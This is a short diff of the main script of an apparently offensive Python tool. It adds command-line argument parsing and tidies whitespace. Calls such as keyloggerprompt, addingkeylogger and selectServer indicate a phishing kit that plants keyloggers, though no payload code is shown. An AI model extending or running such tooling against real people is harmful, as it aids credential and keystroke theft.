@@ -9,9 +9,13 @@ from Defs.Checks import *
 from Defs.Configurations import *
 from Defs.Actions import *
 from Defs.Languages import *
+from Defs.ArgumentHandler import ARGHELP
 from os import system
 
+
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
+
+ARGHELP.parser.parse_args()
 checkPermissions()
 installGetText()
 languageSelector()
@@ -27,7 +31,7 @@ if __name__ == "__main__":
 
         keyloggerprompt()
         addingkeylogger()
-       
+
         inputCustom()
         ##############
         selectServer()
